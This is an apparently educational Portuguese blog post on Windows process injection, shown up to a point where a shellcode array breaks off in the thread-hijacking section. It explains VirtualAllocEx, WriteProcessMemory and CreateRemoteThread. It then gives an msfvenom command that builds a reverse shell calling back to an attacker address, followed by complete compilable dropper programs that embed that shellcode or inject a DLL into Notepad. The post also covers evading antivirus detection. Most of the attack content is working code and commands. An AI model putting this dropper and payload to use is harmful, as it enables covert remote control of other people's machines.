---
title: "Process Injection 101"
author: H41stur
date: 2024-08-07 01:00:00 -0300
categories: [Estudos, WinAPI]
tags: [Shellcoding, Shellcode, Windows API, Kernel, WinAPI, Process Injection]
image: "/img/posts/process-injection.png"
alt: "Process Injection 101"
---

![Process Injection 101](/img/posts/process-injection.png)

# TL;DR

Neste artigo, exploramos a técnica de _Process Injection_, uma abordagem usada por hackers para injetar código malicioso em processos legítimos que já estão em execução. O _Process Injection_ permite a execução de código de maneira furtiva, aproveitando os privilégios e recursos dos processos injetados, o que pode facilitar o acesso a informações sensíveis e a elevação de privilégios. Diversas técnicas são utilizadas para realizar essa injeção, e o artigo fornece uma introdução às mais básicas, com exemplos práticos e referências a conceitos essenciais discutidos em artigos anteriores. Este conteúdo é voltado para aqueles que desejam entender e explorar o funcionamento interno dessas técnicas como parte de seu estudo avançado em hacking.

# Introdução

Seguindo a série de artigos que vem explorando os *shellcodes*, exploração de WinAPI e afins, acredito que explorar o conhecimento base para o *process injection*, é essencial no processo de aprendizagem.

*Process Injection* é uma técnica usada por atacantes para injetar código malicioso em processos legítimos que já estão em execução no sistema operacional. O objetivo dessa técnica é executar código de maneira furtiva, evitando a detecção por softwares de segurança e aproveitando os privilégios e recursos dos processos injetados. Executar código no contexto de outro processo pode permitir acesso à memória do processo, recursos de sistema/rede e possivelmente privilégios elevados.

Há muitas maneiras de injetar código em um processo, muitas das quais abusam de funcionalidades legítimas. Essas implementações existem para todos os principais sistemas operacionais, mas geralmente são específicas da plataforma.

Estas técnicas são amplamente utilizadas por criminosos e existe até mesmo uma [sessão completa](https://attack.mitre.org/techniques/T1055/) sobre o assunto no [MITRE ATT&CK](https://attack.mitre.org/).

A intenção deste artigo é mostrar o pensamento introdutório no processo de *process injection* com as técnicas mais básicas com o intuito de gerar entendimento e curiosidade.

Este artigo utilizará de recursos desenvolvidos nos artigos anteriores, portanto, caso não se sinta familiarizado com alguns temas abordados, recomendo a leitura antecipada na seguinte ordem:

- [Shellcoding 101](https://h41stur.com/posts/shellcoding101/)
- [Evasão de Antivírus - Princípios Gerais e Abordagens Específicas](https://h41stur.com/posts/evasao-av/)
- [Enumerando Processos pelo Nome](https://h41stur.com/posts/get-process/)

# "O" Processo

Existem infinitos motivos para se querer injetar algo em um processo, sua criatividade e necessidade ditarão as regras, você pode ter um *dropper* que foi entregue à vítima em um ataque de *phishing*, que esteja contido em uma planilha do **Excel**, ou um documento de texto, ou um PDF qualquer, tipos de ação que acontecem com frequência *in the wild*.

O que acontece, é que estes tipos de arquivo tem vida útil limitada, ou seja, seu *payload* foi executado quando a vítima abriu aquela planilha do Excel e gerou, por exemplo, um *shell* reverso, mas assim que a planilha for fechada a conexão se perde. Este seria um grande motivo para injetar o código malicioso em outro processo que esteja em execução, um que tenha vida útil mais longa ou que até mesmo seja mais *stealth*.

De forma bem simplificada, o conceito básico de *process injection* consiste em escolher um processo alvo que já esteja em execução.

![](/img/posts/Pasted%20image%2020240807153306.png)

Em seguida, alocamos um espaço de memória dentro deste processo que já, está em execução, este *buffer* de memória precisa ser no mínimo do tamanho do *payload* a ser injetado.

![](/img/posts/Pasted%20image%2020240807153431.png)

O próximo passo é copiar este *payload* para dentro do espaço alocado.

![](/img/posts/Pasted%20image%2020240807153629.png)

E por último, pedimos ao SO para executar o que contém neste espaço de memória, ou seja, nosso *payload*, no processo alvo.

![](/img/posts/Pasted%20image%2020240807154257.png)

O resultado deste processo, será que o *payload* não será executado pelo `dropper.exe` e sim pelo `notepad.exe`, mesmo que o *dropper* seja fechado, o *payload* continuará em execução em outro processo (pelo menos até o Notepad ser fechado, mas aí é questão de escolher bem os processos).

## *Debuggers everywhere*

Conceitualmente é bem simples (na prática, também), as implementações das APIs do Windows voltadas para *debuggers* e, sistematicamente, utilizaremos 3 delas neste processo.

A função [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) permite reservar, confirmar ou alterar o estado de uma região de memória em um processo específico.

Sua sintaxe é:

```cpp
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

Onde:

- `[in] hProcess` é um *handle* para um processo em execução no qual a função irá alocar um espaço de memória. Este *handle* é facilmente obtido com a função [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) passando o PID do processo desejado;
- `[in, optional] lpAddress` é um ponteiro que especifica o endereço de início da região onde desejamos alocar um *buffer*, se for configurado como `NULL` a própria função determina este endereço;
- `[in] dwSize` é o tamanho do *buffer* a ser alocado em *bytes*;
- `[in] flAllocationType` determina o tipo de alocação de memória, para reservarmos e confirmarmos a região da memória, podemos utilizar a combinação `MEM_RESERVE | MEM_COMMIT`;
- `[in] flProtect` determina o tipo da proteção utilizada no *buffer*, como criaremos um espaço onde faremos escrita, leitura e execução, será configurado como `PAGE_EXECUTE_READWRITE`.

Se esta função tiver sucesso, ela retorna o endereço base da região de memória alocada.

A função [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) escreve dados em uma área de memória específica em um processo. É importante que esta área tenha permissão para escrita, por este motivo, quando criamos o *buffer* utilizamos o parâmetro `PAGE_EXECUTE_READWRITE`.

Sua sintaxe é:

```cpp
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

Onde:

- `[in] hProcess` é um *handle* para um processo em execução no qual a função irá alocar um espaço de memória;
- `[in] lpBaseAddress` é um ponteiro para o endereço base onde os dados serão escritos, ou seja, o retorno da função `VirtualAllocEx`;
- `[in] lpBuffer` é um ponteiro para o *buffer* que **contém** os dados a serem gravados, ou seja, um ponteiro para o *payload*;
- `[in] nSize` a quantidade de *bytes* a serem gravados;
- `[out] lpNumberOfBytesWritten` um parâmetro opcional que indica um ponteiro que recebe a quantidade de *bytes* a serem copiados. Pode ser configurado como `NULL`.

Por último, a função [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) cria uma *thread* que é executada no espaço de endereço virtual de outro processo.

Sua sintaxe é:

```cpp
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```

Onde:

- `[in] hProcess` é um *handle* para um processo em execução no qual a função irá alocar um espaço de memória;
- `[in] lpThreadAttributes` é um ponteiro para a estrutura [SECURITY_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)), se lpThreadAttributes for `NULL`, o *thread* obtém um descritor de segurança padrão e o *handle* não pode ser herdado;
- `[in] dwStackSize` o tamanho inicial da *stack* em *bytes*. Se for configurado como zero, a nova *thread* usa o tamanho padrão do executável;
- `[in] lpStartAddress` um ponteiro para a função definida pelo aplicativo do tipo `LPTHREAD_START_ROUTINE` a ser executada pelo thread e representa o endereço inicial do thread no processo remoto. Em nosso caso, o retorno da função `VirtualAllocEx`;
- `[in] lpParameter` um ponteiro para uma variável a ser passada para a função na *thread*, em nosso caso `NULL`;
- `[in] dwCreationFlags` os sinalizadores que controlam a criação da *thread*, quando configurado como zero, a *thread* é executada imediatamente após sua criação;
- `[out] lpThreadId` um ponteiro para uma variável que recebe o identificador da *thread*, se este parâmetro for `NULL`, o identificador da *thread* não será retornado.

Se a função for bem-sucedida, o valor de retorno será um identificador para a nova *thread*.

A junção destas funções consegue completar o ciclo descrito no modelo conceitual ilustrado.

# *Code Injection*

O nosso *payload* pode ter uma infinidade de formatos, um dos mais clássicos é o *code injection*, onde um código, ou *shellcode* é injetado em um processo.

Para implementação e teste do *process injection*, além do descrito até o momento precisamos de um *payload*. A fim de poupar tempo, utilizarei o [MSFvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) para criar um *payload* de *reverse shell*.

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.71.128 LPORT=8443 -f c
```

![](/img/posts/Pasted%20image%2020240807193944.png)

A função `OpenProcess` que retornará o *handle* para o processo alvo, precisa do PID deste processo para ser executada, nesse ponto, podemos inseri-lo manualmente, ou, como no último artigo, [Enumerando Processos pelo Nome](https://h41stur.com/posts/get-process/), criamos um programa que retorna o PID de um processo pesquisando pelo nome, podemos automatizar esta etapa. Abaixo o script do último artigo:

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int findPID(const char *procName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    int pid = 0;
    BOOL proc;

    // snapshot de todos os processos em execucao
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // inicializando dwSize
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // inicio da iteracao, primeiro processo
    proc = Process32First(hSnapshot, &pe32);

    // loop para iterar sobre os processos
    while (proc) {
        if (strcmp(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
        proc = Process32Next(hSnapshot, &pe32);
    }

    // fecha o handle aberto
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0;

    pid = findPID(argv[1]);
    if (pid) {
        printf("PID of %s: %d\n", argv[1], pid);
    }
    return 0;
}
```


Com estas informações em mãos, podemos criar o programa que fará o uso de todos os recursos necessários.

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

unsigned int payload_len = sizeof(payload);

int findPID(const char *procName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    int pid = 0;
    BOOL proc;

    // snapshot de todos os processos em execucao
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // inicializando dwSize
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // inicio da iteracao, primeiro processo
    proc = Process32First(hSnapshot, &pe32);

    // loop para iterar sobre os processos
    while (proc) {
        if (strcmp(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
        proc = Process32Next(hSnapshot, &pe32);
    }

    // fecha o handle aberto
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0;
    HANDLE procH; // process handle
    HANDLE remoteT; // remote thread
    LPVOID remoteB; // remote buffer

    pid = findPID(argv[1]);

    // cria o handle para o processo
    procH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    // aloca o buffer de memoria no processo remoto
    remoteB = VirtualAllocEx(procH, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // copia o payload entre os processos
    WriteProcessMemory(procH, remoteB, payload, payload_len, NULL);

    // Iniciamos uma thread com o payload copiado
    remoteT = CreateRemoteThread(procH, NULL, 0, (LPTHREAD_START_ROUTINE)remoteB, NULL, 0, NULL);

    CloseHandle(procH);
    return 0;
}
```

Podemos compilar o programa:

```bash
$ x86_64-w64-mingw32-gcc dropper.cpp -o dropper.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```


Uma vez com o executável na máquina Windows alvo, podemos abrir uma aplicação qualquer, no exemplo utilizei o `Notepad.exe` e invocar o dropper passando o nome do processo.

![](/img/posts/Pasted%20image%2020240807194311.png)

E conseguimos o *reverse shell* na máquina atacante.

![](/img/posts/Pasted%20image%2020240807194340.png)

## Validando a Injeção

Até aqui, ok, recebemos a conexão reversa do alvo e vimos que o `dropper.exe` se encerrou logo após sua execução, porém, é possível validar sua eficácia. Para isso, podemos usar o programa [Process Hacker 2](https://processhacker.sourceforge.io/downloads.php). Este programa mapeia todos os processos em execução no Windows e nos trás informações completas sobre estes processos.

Ao iniciarmos o *Process Hacker*, já podemos ver que o programa `Notepad.exe` criou um novo processo invocando o `cmd.exe`.

![](/img/posts/Pasted%20image%2020240807194911.png)

Se navegarmos para a aba "*Network*" podemos ver que o Notepad está fazendo uma conexão TCP para a máquina atacante.

![](/img/posts/Pasted%20image%2020240807195240.png)

Quando expandimos o processo Notepad.exe e analisamos a aba "*Memory*", podemos rolar a barra até encontrarmos as regiões de memória com permissão de leitura e execução (RX) que correspondem ao nosso *buffer*.

![](/img/posts/Pasted%20image%2020240807200156.png)

E se analisarmos as DLLs carregadas, vemos que o Notepad carregou a `ws2_32.dll` responsável pela comunicação TCP, algo que nunca aconteceria em circunstâncias normais.

# *DLL Injection*

Outra técnica de *process injection* bastante difundida é o *DLL Injection*, onde forçamos uma aplicação a carregar uma DLL maliciosa. Por mais que DLLs e .exe façam parta da mesma família, é preciso entender um pouco sobre suas diferenças e sobre a estrutura básica de uma DLL.

Quando executamos um`.exe`, o SO separa um espaço de memória, carrega o executável neste espaço e cria um processo, só a partir disso o carregador do SO procura pelo ponto de entrada do executável para o iniciar, o que geralmente é a função `main` oi `WinMain` quando ela existe.

Já no caso das DLLs, como são bibliotecas dinâmicas com intuito de exportar funções, elas podem ser carregadas por vários programas simultaneamente. Portanto, uma DLL só é invocada, quando um processo na memória, precisa dos seus recursos por qualquer motivo, a carregando dentro de seu próprio espaço. Neste caso, a DLL só é carregada quando todo o processo já foi criado, fazendo com que ela seja executada instantaneamente quando é invocada.

Quando uma DLL  é carregada em um processo no Windows, o sistema operacional invoca uma função especial chamada **DllMain** como ponto de entrada da DLL. Essa função é chamada pelo carregador do Windows sempre que ocorrem certos eventos no ciclo de vida da DLL, como quando a DLL é carregada ou descarregada do processo, ou quando um novo thread é criado ou encerrado no processo que usa a DLL.

A assinatura da função `DllMain` é a seguinte:

```cpp
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);
```

Onde: 

- **HMODULE hModule:** Um handle para o módulo da DLL. Esse handle pode ser usado para identificar a instância da DLL;
- **DWORD ul_reason_for_call:** Um valor que indica o motivo pelo qual a função `DllMain` está sendo chamada. Pode assumir um dos seguintes valores:
    - `DLL_PROCESS_ATTACH`: A DLL está sendo carregada no espaço de endereço de um processo.
    - `DLL_THREAD_ATTACH`: Um thread está sendo criado no processo que já está carregando a DLL.
    - `DLL_THREAD_DETACH`: Um thread que está sendo encerrado está descarregando a DLL.
    - `DLL_PROCESS_DETACH`: A DLL está sendo descarregada do espaço de endereço de um processo.
- **LPVOID lpReserved:** Reservado para uso futuro. Normalmente, é NULL, mas pode ter um valor especial durante a fase de encerramento do processo.

De forma bem simplista, a função `DllMain` tem o seguinte formato:

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Código de inicialização quando a DLL é carregada
        break;
    case DLL_THREAD_ATTACH:
        // Código de inicialização quando um thread é criado
        break;
    case DLL_THREAD_DETACH:
        // Código de limpeza quando um thread é encerrado
        break;
    case DLL_PROCESS_DETACH:
        // Código de limpeza quando a DLL é descarregada
        break;
    }
    return TRUE; // Indica que a inicialização foi bem-sucedida
}
```

## Eventos da DllMain

1. **DLL_PROCESS_ATTACH:**
    
    - Esse evento ocorre quando a DLL é carregada pela primeira vez no espaço de endereço de um processo.
    - Geralmente, você coloca código de inicialização aqui, como a alocação de memória, inicialização de dados, ou configuração de estados globais.
    - Retornar `FALSE` nesse ponto impede que a DLL seja carregada.
2. **DLL_THREAD_ATTACH:**
    
    - Esse evento ocorre quando um novo thread é criado no processo que já está carregando a DLL.
    - É raramente usado, mas pode ser útil se a DLL precisar fazer alguma inicialização específica para cada thread.
3. **DLL_THREAD_DETACH:**
    
    - Esse evento ocorre quando um thread está sendo encerrado no processo que está carregando a DLL.
    - Similar ao `DLL_THREAD_ATTACH`, é raramente usado, mas pode ser necessário para limpar recursos alocados para cada thread.
4. **DLL_PROCESS_DETACH:**
    
    - Esse evento ocorre quando a DLL está sendo descarregada do espaço de endereço de um processo.
    - É usado para liberar recursos alocados durante `DLL_PROCESS_ATTACH` ou para fazer qualquer outra limpeza necessária.

Uma DLL "convencional" tem, além da `DllMain` uma série de funções para serem exportadas (essa é sua função), porém, no contexto *hacking* dificilmente há necessidade de haver outras funções. Isso se dá pelo fato de que a `DllMain` é executada instantaneamente assim que a DLL é carregada em um processo, fazendo com que todo o código malicioso que ela contenha, também seja descarregado. PPortanto, estaé a solução mais simples.

## Criando uma DLL

Para fins de estudo, criaremos nossa própria DLL para ser usada no *process injection*, a idéia é criar uma simples caixa de texto que será invocada quando a DLL for carregada em um processo já existente.

```cpp
#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            MessageBox(
                    NULL,
                    "Do you realy want to hack the planet??!",
                    "H41stur",
                    MB_YESNO
                    );
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

Podemos compilar o objeto:

```bash
x86_64-w64-mingw32-g++ -shared -o mydll.dll mydll.cpp -fpermissive
```

Após a compilação, podemos armazená-la em algum diretório da máquina alvo, em meu caso ficará em `c:\mydll.dll`.

## Injetando a DLL

O programa que fará a injeção da DLL é basicamente o mesmo utilizado para injeção de código, pois o processo é idêntico, somente três implementações foram feitas:

1. O payload que antes era um *shellcode* foi substituído pelo caminho da DLL em disco (`c:\mydll.dll`);
2. Antes de injetar e executar a DLL, é preciso obter o endereço de memória da `LoadLibraryA`, pois esta será uma chamada de API que será executada no contexto da vítima e ela precisará desta função para carregar nossa DLL;
3. Na função `CreateRemoteThread` passamos o endereço da `LoadLibraryA` como argumento `lpStartAddress` e a variável que contém o endereço da nossa DLL no parâmetro `lpParameter`.

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

char Dll[] = "C:\\mydll.dll";
unsigned int Dll_len = sizeof(Dll) + 1;

int findPID(const char *procName) {

    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    int pid = 0;
    BOOL proc;

    // snapshot de todos os processos em execucao
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    // inicializando dwSize
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // inicio da iteracao, primeiro processo
    proc = Process32First(hSnapshot, &pe32);

    // loop para iterar sobre os processos
    while (proc) {
        if (strcmp(procName, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
        proc = Process32Next(hSnapshot, &pe32);
    }

    // fecha o handle aberto
    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char* argv[]) {
    int pid = 0;
    HANDLE procH; // process handle
    HANDLE remoteT; // remote thread
    LPVOID remoteB; // remote buffer

    // handle para kernel32 para encontrar LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

    pid = findPID(argv[1]);

    // cria o handle para o processo
    procH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

    // aloca o buffer de memoria no processo remoto
    remoteB = VirtualAllocEx(procH, NULL, Dll_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // copia o payload entre os processos
    WriteProcessMemory(procH, remoteB, Dll, Dll_len, NULL);

    // Iniciamos uma thread com o payload copiado
    remoteT = CreateRemoteThread(procH, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remoteB, 0, NULL);

    CloseHandle(procH);
    return 0;
}


```

Compilamos o programa:

```bash
$ x86_64-w64-mingw32-gcc -O2 dropperDLL.cpp -o dropperDLL.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

Para testar, iniciamos uma instância do Notepad.exe na máquina alvo e invocamos nosso programa.

![](/img/posts/Pasted%20image%2020240807215827.png)

E a DLL maliciosa foi injetada com sucesso no processo alvo.

Se analisarmos com o *Process Hacker 2* pela aba "*Memory*", podemos ver na área de memória com permissões de leitura e execução, que nossa DLL foi de fato carregada no processo.

![](/img/posts/Pasted%20image%2020240807220003.png)

# *Thread Hijacking*

Nos exemplos anteriores testamos injeção tanto de código quanto de DLL, ambos os processos quase iguais, a diferenciar pouca coisa, porém, uma característica em comum entre ambas as técnicas é a criação de uma nova *thread* que executa o *payload*. Utilizamos nos exemplos a função `CreateRemoteThread` para este fim.

Independente do método de ofuscação utilizado, o uso desta função se torna "manjado" por vários antivírus, o que a torna um alvo em potencial no processo de detecção.

Porém, existem inúmeras técnicas de *process injection* que não utilizam a função `CreateRemoteThread`, uma delas é o *thread hijacking*.

*Thread hijacking* nada mais é do que forçar uma *thread* original do nosso processo alvo a executar nosso *payload*. Desta forma nenhuma nova *thread* precisa ser criada.

No artigo anterior, [Enumerando Processos pelo Nome](https://h41stur.com/posts/get-process/) tivemos uma visão global sobre a [*Tool Help Library*](https://learn.microsoft.com/en-us/windows/win32/toolhelp/tool-help-library) que nos permite enumerar todos os processos, *threades*, módulos e memória dos processos em execução.

Inclusive, nos exemplos deste artigo, utilizamos a *Tool Help Library* para criar um *snapshot* dos processos e encontrarmos o processo alvo pelo nome.

Seguindo o mesmo princípio, também podemos extrair um *snapshot* de todas as *threads* em execução e encontrar, por exemplo, a primeira *thread* criada pelo nosso processo alvo, fazemos isso comparando o PID do processo com o parâmetro `th32OwnerProcessID` contido na estrutura [THREADENTRY32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32). Quando encontrarmos esta *thread*, podemos criar um *handle* que aponta para ela com a função [OpenThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) utilizando seu ID.

```cpp
THREADENTRY32 te;
CONTEXT cont;
HANDLE ht;

thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
if (Thread32First(thSnapshot, &te)) {
	do {
		if (pid == te.th32OwnerProcessID) {
			ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			break;
		}
	} while(Thread32Next(thSnapshot, &te))
}
```

Com o *handle* desta *thread*, podemos usar a função [SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) para suspendê-la.

```cpp
SuspendThread(ht);
```

Agora o processo fica interessante, pois com a *thread* suspensa, podemos manipulá-la. Primeiramente, precisamos captar o contexto desta *thread* com a função [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext), esta função salva o contexto da *thread* em uma estrutura [CONTEXT](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context), esta estrutura armazena, entre outras informações, o valor configurado para cada registrador do processador, responsável pela execução da *thread*.

```cpp
GetThreadContext(ht, &cont)
```

Uma vez que temos o estado de cada registrador, também podemos modificá-los, e é nesse ponto que modificamos o `RIP` (*instruction pointer*) da *thread* para apontar para o endereço do *buffer* para onde copiamos nosso *payload*.

```cpp
cont.Rip = (DWORD_PTR)remoteB;
```

Após a alteração do contexto, usamos a função [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) para gravar o contexto adulterado. E, em seguida, resumimos a *thread* com a função [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread).

```cpp
SetThreadContext(ht, &cont);
ResumeThread(ht);
```

Juntando tudo no código, temos:

```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
